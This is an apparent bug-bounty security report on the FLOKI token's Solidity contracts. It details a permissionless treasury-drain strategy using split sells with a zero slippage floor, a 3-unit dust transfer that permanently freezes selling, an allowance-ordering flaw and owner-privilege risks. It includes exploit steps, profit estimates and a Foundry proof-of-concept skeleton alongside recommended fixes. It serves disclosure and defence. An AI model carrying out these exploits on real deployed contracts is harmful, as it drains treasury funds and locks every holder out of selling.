# Bug Report — FLOKI Token Contracts

| | |
|---|---|
| **Target** | FLOKI token system (`contracts/Floki.sol`, `contracts/treasury/TreasuryHandlerAlpha.sol`, `contracts/tax/*`, `contracts/utils/*`) |
| **Commit reviewed** | `bbfd130` |
| **Compiler** | Solidity `0.8.11` |
| **Dependencies** | `@openzeppelin/contracts ^4.3.2`, `@uniswap/v2-periphery ^1.1.0-beta.0` |
| **Report date** | 2026-08-11 |
| **Class** | Access control · price-oracle / slippage · denial of service |
| **Headline severity** | **Critical** (permissionless fund drainage + permanent sell freeze) |

> **Scope note for triage.** Findings 1–3 require **no privileges** — any external account can execute
> them against a correctly-deployed contract. These are the primary claims. Findings 4–6 require a
> malicious or compromised `owner`; they are included for completeness and may fall under a program's
> "privileged role / centralization" policy. Rate the report on findings 1–3.
>
> **Verification basis.** All line references were checked against the repository source. Claims about
> `UniswapV2Router02` / `UniswapV2Pair` internals are reasoned from the canonical published UniswapV2
> source (dependencies were not installed in the review environment). A runnable Foundry PoC skeleton
> is provided in the appendix; it has not been executed against a live fork in this environment.

---

## Summary

The FLOKI token delegates transfer-time logic to two hot-swappable satellite contracts. The treasury
satellite (`TreasuryHandlerAlpha`) exposes a **permissionless** function that forces the protocol
treasury to market-sell its accumulated tax tokens through Uniswap **with the minimum-output set to
zero** (`amountOutMin = 0`). Any account can call it, choose the moment, and — by walking the pool
price down with tax-tier-limited split sells — force the treasury to liquidate its entire balance at
a price the attacker controls, capturing the difference at roughly zero net capital.

A second, independent bug lets **any account permanently disable selling for every holder** by
transferring **3 base units** of the token to the treasury handler, because a dust balance routes a
zero-output swap into the router, which reverts and propagates into every seller's transfer. The
contract's own recovery function refuses to clear the condition.

---

## Finding 1 — Permissionless, floor-less treasury drainage — **CRITICAL**

### Location
- `contracts/treasury/TreasuryHandlerAlpha.sol:77` — `beforeTransferHandler` (no access control)
- `contracts/treasury/TreasuryHandlerAlpha.sol:234` — `swapExactTokensForETHSupportingFeeOnTransferTokens(..., 0, ...)` (`amountOutMin = 0`)
- `contracts/tax/ExponentialTaxHandler.sol:70-80` — per-transaction tax tiers (enable the split-sell bypass)

### Root cause
`beforeTransferHandler` is `external` with only a reentrancy guard — **no caller restriction** — and
the interface it implements (`ITreasuryHandler`) declares no authentication:

```solidity
function beforeTransferHandler(address benefactor, address beneficiary, uint256 amount)
    external nonReentrant                              // ← anyone can call this
{
    benefactor; amount;                                 // ignored (lines 83-84)
    if (!_exchangePools.contains(beneficiary)) return;  // only gate: beneficiary ∈ public pool set
    ...
    _swapTokensForEth(tokensForSwap);                   // sells treasury tokens for ETH
}

function _swapTokensForEth(uint256 tokenAmount) private {
    ...
    router.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount,
        0,                                              // ← accepts ANY output, no slippage floor
        path, address(this), block.timestamp
    );
}
```

Because `benefactor`/`amount` are discarded and `beneficiary` need only be the publicly-readable
`primaryPool`, an attacker can invoke the treasury's market sell on demand, at a price of their
choosing, with no minimum-output protection.

### Exploit
In one transaction (inventory flash-loanable; strategy is ETH-neutral):

1. **Depress the price** with a series of sub-sells, each kept `≤ 3%` of the pool so the anti-whale
   tax stays in its 3% tier instead of the 81% tier (`ExponentialTaxHandler.sol:72-80`). Each sub-sell
   also re-triggers a treasury dump — the reentrancy guard resets between sequential calls
   (`LenientReentrancyGuard.sol:37-48`), so it does not cap the count.
2. **Force out the remaining treasury balance** with direct `beforeTransferHandler(0, primaryPool, 0)`
   calls. Each dumps up to the per-trigger cap of the *now-depressed* pool at `amountOutMin = 0`.
3. **Buy back** with the ETH raised. The depressed price returns more tokens than were sold; the
   attacker ends ETH-neutral holding the surplus, which is exactly the value the treasury lost.

### Impact (worked example)
Pool `1,000,000 FLOKI / 1,000 ETH`, treasury balance `200,000 FLOKI` (20% of the pool):

- Treasury realises **~114 ETH** for its whole balance vs **~167 ETH** for an honest single sale — a
  **~52 ETH (~31%) loss**, and ~86 ETH below naive spot value.
- The ~52 ETH is captured by the attacker as a **~71,000-FLOKI back-run surplus (~55 ETH)**, at ≈ zero
  net ETH capital.
- Net of a non-exempt attacker's ~6% tax drag: **~38–40 ETH profit**, **repeatable** each time the
  treasury re-accumulates. Payoff scales monotonically with the treasury balance, which nothing caps.

Note: access control alone does **not** fix this — the treasury also dumps on any *organic* sell, so a
standard cross-transaction sandwich exploits the same `amountOutMin = 0` without ever calling
`beforeTransferHandler`.

### Recommended fix
Both are required:
1. Restrict the hooks to the token: `require(msg.sender == address(token))`.
2. Replace `amountOutMin = 0` with a floor derived from a Uniswap V2 **TWAP** (a same-block
   `getAmountsOut` is not a fix — it reads the manipulated spot price), or move the swap out of the
   transfer path into a keeper-only `processTreasury(uint256 amountOutMin, uint256 deadline)` where the
   floor is computed off-chain. Also replace the `block.timestamp` deadline with a real value.

---

## Finding 2 — Permanent sell freeze via 3-wei dust transfer — **CRITICAL (DoS)**

### Location
- `contracts/treasury/TreasuryHandlerAlpha.sol:91-117` — dust-balance path
- `contracts/Floki.sol:442` — `require(amount > 0)` (propagates the revert)
- `contracts/treasury/TreasuryHandlerAlpha.sol:210-213` — `withdraw` refuses to release the token

### Root cause
The balance guard tests the raw balance before the price-impact clamp, so a tiny balance still enters
the swap path:

```solidity
uint256 contractTokenBalance = token.balanceOf(address(this));   // e.g. 3
if (contractTokenBalance > 0) {                                  // 3 > 0 → true
    ...
    uint256 tokensForSwap = contractTokenBalance - tokensForLiquidity; // = 3
    _swapTokensForEth(tokensForSwap);   // swaps 3 units → getAmountOut rounds to 0 → pair reverts
```

`UniswapV2Pair.swap` reverts `INSUFFICIENT_OUTPUT_AMOUNT` on a zero-output swap. The revert
propagates: `pair.swap → router → _swapTokensForEth → beforeTransferHandler → FLOKI._transfer →` the
seller's `transferFrom`.

### Exploit
```solidity
token.transfer(treasuryHandlerAddress, 3);   // ordinary untaxed transfer, ~21k gas
```
Every subsequent **sell** by every holder now reverts. **Buys and wallet transfers still succeed** —
the classic honeypot signature. The state is not self-clearable: selling the dust *is* the reverting
op; lowering `priceImpactBasisPoints` clamps to 0 and still reverts; and `withdraw` is blocked by
`require(tokenAddress != address(token))` at line 210-213. Only the owner's `FLOKI.setTreasuryHandler`
recovers — and if ownership was renounced, the freeze is **irreversible**.

### Impact
Permanent, permissionless denial of the sell path for the entire holder base, for the cost of dust.

### Recommended fix
Skip (never revert) when the amount to swap is below a non-zero `minimumSwapThreshold`; wrap treasury
processing in `try/catch` so it can never brick a transfer; and allow the accumulating token to be
withdrawn so the condition is recoverable.

---

## Finding 3 — `transferFrom` spends the allowance after executing the transfer — **HIGH**

### Location
`contracts/Floki.sol:169-186`

### Root cause
```solidity
function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);                       // effects + 3 external calls FIRST
    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(currentAllowance >= amount, "...ALLOWANCE_EXCEEDED...");
    unchecked { _approve(sender, _msgSender(), currentAllowance - amount); }
    return true;
}
```

The allowance is validated and decremented **after** `_transfer`, which performs three external calls
(`beforeTransferHandler`, `getTax`, `afterTransferHandler`) and mutates balances. This inverts
checks-effects-interactions: a handler that re-enters `transferFrom` for the same `(sender, spender)`
reads the not-yet-decremented allowance and can spend it again. `FLOKI._transfer` has no reentrancy
guard, and the treasury guard is lenient (silently returns), so the token relies on a property of a
contract it does not control and can swap at will (Finding 4).

### Impact
Allowance double-spend if any current or future handler calls back into `transferFrom`. Also spends an
allowance that was never validated to exist, after emitting events and running third-party code.

### Recommended fix
Check and decrement the allowance **before** calling `_transfer`; add the conventional
`type(uint256).max` infinite-approval exemption.

---

## Findings 4–6 — Privileged (require malicious/compromised owner)

> Included for completeness. May be out of scope under a "centralization / privileged role" policy —
> triage accordingly.

**Finding 4 — Unbounded hot-swappable handlers → 100% honeypot / freeze — CRITICAL (privileged).**
`FLOKI.setTaxHandler` / `setTreasuryHandler` (`Floki.sol:312-328`) accept any address with no tax
ceiling and no timelock. The owner installs a handler returning `tax == amount` (100% sell tax; owner
exempt) or `amount + 1` (underflows `Floki.sol:448` → per-address or global freeze) in one
transaction. **Fix:** enforce `MAX_TAX_BASIS_POINTS` inside `FLOKI._transfer`; timelock the setters;
disable `renounceOwnership`; move ownership to a multisig.

**Finding 5 — One-call permanent sell disable — HIGH/CRITICAL (privileged).**
`setPriceImpactBasisPoints` (`TreasuryHandlerAlpha.sol:176-186`) has no lower bound, so `0` is
accepted → clamps every sell's swap amount to 0 → reverts (Finding 2 mechanism). Same effect from an
unset `primaryPool` (the deploy-script default state) or a `treasury` address whose `receive` reverts
(`:132`). **Fix:** floor `priceImpactBasisPoints`; fail-soft on unset pool; make the ETH send
non-reverting.

**Finding 6 — `ExponentialTaxHandler` charges 81% when `primaryPool` is unset — HIGH (privileged/config).**
When `primaryPool == address(0)` (deploy default), `priceImpactBasisPoint == 0` and all tier
comparisons collapse to `amount <= 0`, so every sell falls to the **81%** branch
(`ExponentialTaxHandler.sol:78`). No setter exists to lower the hardcoded rates. **Fix:** fail *open*
to the base rate when the pool balance is zero; add owner-only rate setters that can only lower rates.

---

## What is NOT vulnerable (verified)

- **No inflation.** No mint function exists; `totalSupply()` is a `pure` constant; `_transfer`
  conserves value in every branch (a hostile tax handler can redirect ≤100% but cannot inflate —
  `tax > amount` reverts on `Floki.sol:448`).
- **Governance checkpoints are conservative.** `votes[R] == Σ balances of R's delegators` holds across
  all transfer/delegation paths; the `getVotesAtBlock` binary search cannot underflow.
- **`delegateBySig` replay is prevented** by the nonce increment (`Floki.sol:255`), despite `ecrecover`
  signature malleability.

---

## Appendix — PoC skeleton (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;
// Illustrative skeleton — fill in fork setup, router/pool addresses, and flash-loan wiring.

interface IFloki   { function transfer(address,uint256) external returns (bool); function balanceOf(address) external view returns (uint256); }
interface ITreasury{ function beforeTransferHandler(address,address,uint256) external; function primaryPool() external view returns (address); }

contract FlokiDrainPoC {
    IFloki floki; ITreasury treasury; address pool; /* router, weth */

    // Finding 1: force floor-less liquidation of the treasury bag.
    function drain(uint256 subSell, uint256 n) external {
        for (uint256 i; i < n; ++i) {
            _sell(subSell);                                   // keep ≤3% of pool → 3% tax tier; also triggers a dump
            treasury.beforeTransferHandler(address(0), pool, 0);  // force an extra tranche at the depressed price
        }
        _buyBackAll();                                        // ETH-neutral; keep the surplus FLOKI
    }

    // Finding 2: permanently brick the sell path.
    function permafreeze() external { floki.transfer(address(treasury), 3); }

    function _sell(uint256) internal { /* router.swapExactTokensForETHSupportingFeeOnTransferTokens */ }
    function _buyBackAll() internal  { /* router.swapExactETHForTokensSupportingFeeOnTransferTokens */ }
}
```

**Suggested assertions:** (a) after `drain`, `floki.balanceOf(treasuryHandler)` ≈ 0 and the PoC
contract's ETH-value increased with no net ETH input; (b) after `permafreeze`, any third-party sell
through the router reverts while a buy succeeds.

---

## Severity rationale

| # | Finding | Privilege | Severity |
|---|---------|-----------|----------|
| 1 | Permissionless floor-less treasury drainage | none | **Critical** |
| 2 | 3-wei dust permanent sell freeze | none | **Critical (DoS)** |
| 3 | `transferFrom` allowance-after-transfer | none (conditional on handler) | **High** |
| 4 | Unbounded handler swap → honeypot/freeze | owner | Critical* |
| 5 | One-call permanent sell disable | owner | High/Critical* |
| 6 | 81% sell tax on unset `primaryPool` | owner/config | High* |

\* privileged — may be out of scope depending on program policy.

Full technical write-ups, escalation analysis, and the EVM-level attack trace are in the `audit/`
directory of this repository.
